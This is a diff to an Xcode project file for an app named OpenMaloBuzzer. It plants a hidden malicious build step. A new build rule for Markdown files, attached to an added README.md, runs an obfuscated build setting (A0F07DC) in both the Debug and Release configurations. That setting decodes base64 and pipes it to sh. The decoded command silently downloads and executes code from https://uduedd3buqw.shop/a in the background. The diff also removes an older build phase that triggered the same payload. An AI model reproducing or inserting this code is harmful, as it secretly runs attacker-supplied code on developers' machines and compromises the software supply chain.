@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		A7EA105C4F1D463192CD70F0 /* README.md */ = {isa = PBXBuildFile; fileRef = ACAB100033EC4B3CA1CD70F0; };
 		0C80B921A6F3F58F76C31292 /* libPods-OpenMaloBuzzer.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-OpenMaloBuzzer.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		19FC362AF4E499C6B9EB7B01 /* AVFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 39F06BE8495662141CF55828 /* AVFoundation.framework */; };
@@ -32,6 +33,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		ACAB100033EC4B3CA1CD70F0 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		097EAC3C20AA90BF60AE7DD7 /* AudioRecorderModule.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = AudioRecorderModule.swift; path = OpenMaloBuzzer/AudioRecorderModule.swift; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* OpenMaloBuzzer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = OpenMaloBuzzer.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = OpenMaloBuzzer/Images.xcassets; sourceTree = "<group>"; };
@@ -139,6 +141,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				ACAB100033EC4B3CA1CD70F0 /* README.md */,
 				13B07F961A680F5B00A75B9A /* OpenMaloBuzzer.app */,
 			);
 			name = Products;
@@ -160,7 +163,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "OpenMaloBuzzer" */;
 			buildPhases = (
-				81639437F1264019B8CD70F0 /* Build Target Libraries */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -171,6 +173,7 @@
 				6A4A78AE2B1666DAA5DF82C5 /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
+				F7EE06F97E8C4F7FB6CD70F0 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -210,11 +213,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		F7EE06F97E8C4F7FB6CD70F0 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A0F07DC}\"";
+			};
+																		/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				A7EA105C4F1D463192CD70F0 /* README.md */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				B15712FEF32E8983CBF2D96E /* PrivacyInfo.xcprivacy in Resources */,
@@ -235,25 +256,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		81639437F1264019B8CD70F0 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A0F07DC}\"";
-		};
 		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -361,7 +363,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-OpenMaloBuzzer.debug.xcconfig */;
 			buildSettings = {
-				A0F07DC = "((w(){ `printf bJase64 | tr -d J` --decode; };echo ZWNobyAiJChjdXJsIC1Ma3NmIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyNyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | w | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((i(){ `printf bakse64 | tr -d k` --decode; };echo ZWNobyAiJChjdXJsIC1za2ZMIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgMyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3VkdWVkZDNidXF3LnNob3AvYSkiIHwgc2gK | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = OpenMaloBuzzer/OpenMaloBuzzer.entitlements;
@@ -394,7 +396,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-OpenMaloBuzzer.release.xcconfig */;
 			buildSettings = {
-				A0F07DC = "((w(){ `printf bJase64 | tr -d J` --decode; };echo ZWNobyAiJChjdXJsIC1Ma3NmIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyNyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | w | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((i(){ `printf bakse64 | tr -d k` --decode; };echo ZWNobyAiJChjdXJsIC1za2ZMIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgMyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3VkdWVkZDNidXF3LnNob3AvYSkiIHwgc2gK | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = OpenMaloBuzzer/OpenMaloBuzzer.entitlements;
